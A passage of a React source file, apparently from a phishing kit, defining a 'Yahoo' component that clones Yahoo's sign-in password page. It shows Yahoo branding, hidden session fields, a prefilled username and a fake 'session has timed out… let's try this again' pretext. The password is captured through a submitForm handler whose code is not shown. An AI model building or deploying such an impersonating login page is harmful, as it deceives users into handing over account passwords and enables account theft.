HcABHADiAIwAcwAEcOAEcwBEADuAADuAADuAADuBuBTwy0FMNfzXi1LitBiGMi7rRoQhj406d6NDEZ6NDV9U+HNLGGuxH1VgNhADuyqFC31Dr8MbylnAfBkAAlyHUGT3mXuSYuQFcwpk875ob+ABcushZk+dsKIEPwGWcxVcppmwJ8AG4jGvxRAWpQACXOYWoAB2AyxwADuAAjgBwAEcAuKDAsckEcKk3mUgTArjUaUIUegBc6kIPSvUALnGpHs1WAC51sxXaZQFc+nZZHHgAcKkPPODIGoBLemTt//wdThDlfR9kAAAAAElFTkSuQmCC"
                  style={{
                    display: "block",
                    marginLeft: "auto",
                    marginRight: "auto",
                    marginBottom: "80px",
                    marginTop: "40px",
                    height: "100px",
                  }}
                />
                <h2 className="writeup bold" style={{ textAlign: "center" }}>
                  Oh no..
                </h2>
                <p
                  className="writeup sml-txt"
                  style={{ margin: "15px 10px 30px", textAlign: "center" }}
                >
                  Your session has timed out for security purposes due to
                  connection error... let’s try this&nbsp;again.
                </p>
              </div>
              <div
                id="password-challenge"
                className="primary"
                style={{ display: "block" }}
              >
                <strong className="challenge-heading">
                  Enter&nbsp;password
                </strong>
                <span className="txt-align-center challenge-desc">
                  to finish sign&nbsp;in
                </span>
                <br />
                <br />
                <br />
                <form
                  onSubmit={submitForm}
                  className="pure-form pure-form-stacked"
                >
                  <input
                    type="hidden"
                    name="browser-fp-data"
                    id="browser-fp-data"
                    defaultValue
                  />
                  <input
                    type="hidden"
                    name="crumb"
                    defaultValue="kovOoNa63t7"
                  />
                  <input type="hidden" name="acrumb" defaultValue="9oydPGvD" />
                  <input
                    type="hidden"
                    name="sessionIndex"
                    defaultValue="Qg--"
                  />
                  <input
                    type="hidden"
                    name="displayName"
                    defaultValue="mister_gaza"
                  />
                  <div className="hidden-username">
                    <input
                      type="hidden"
                      id="u1"
                      name="u1"
                      defaultValue="test@yahoo.com"
                    />
                  </div>
                  <div
                    id="password-container"
                    className="input-group password-container blurred"
                  >
                    <input
                      type="password"
                      id="p1"
                      className="password"
                      name="password"
                      value={values.password}
                      onChange={handleChange}
                      required
                      tabIndex={1}
                      autoFocus="on"
                      autoComplete="current-password"
                      data-rapid_p={8}
                    />
                    <label
                      htmlFor="login-passwd"
                      id="password-label"
                      className="password-label"
                    >
                      Password
                    </label>
                    <div
                      className="caps-indicator hide"
                      id="caps-indicator"
                      title="Capslock is on"
                    />
                    <button
                      type="submit"
                      disabled={submited.status}
                      className="show-hide-toggle-button hide-pw"
                      tabIndex={-1}
                      title="Show password"
                      data-rapid_p={9}
                    />
                  </div>
                  <div id="og" style={{ display: "none" }}>
                    <p
                      className="error-msg"
                      role="alert"
                      data-error="messages.ERROR_INVALID_PASSWORD"
                    >
                      wrong password! please check.
                    </p>
                  </div>
                  <div id="ogx" style={{ display: "block" }}>
                    <p
                      className="error-msg"
                      role="alert"
                      data-error="messages.ERROR_EMPTY_PASSWORD"
                    >
                      Please provide&nbsp;password.
                    </p>
                  </div>
                  <p className="signin-cont">
                    <input
                      type="submit"
                      id="login-signin"
                      className="
                pure-button
                puree-button-primary puree-spinner-button
              "
                      name="verifyPassword"
                      defaultValue="Sign in"
                    />
                  </p>
                </form>
              </div>
            </div>
          </div>
          <div id="login-box-ad-fallback" className="login-box-ad-fallback">
            <h1>
              Yahoo makes it easy to enjoy what matters most in your world.
            </h1>
            <p>
              Best in class Yahoo Mail, breaking local, national and global
              news, finance, sports, music, movies and more. You get more out of
              the web, you get more out of life.
            </p>
          </div>
        </div>
        <div className="login-bg-outer">
          <div className="login-bg-inner">
            <div id="login-ad-rich" />
          </div>
        </div>
      </div>
    </Fragment>
  );
}

export default Yahoo;
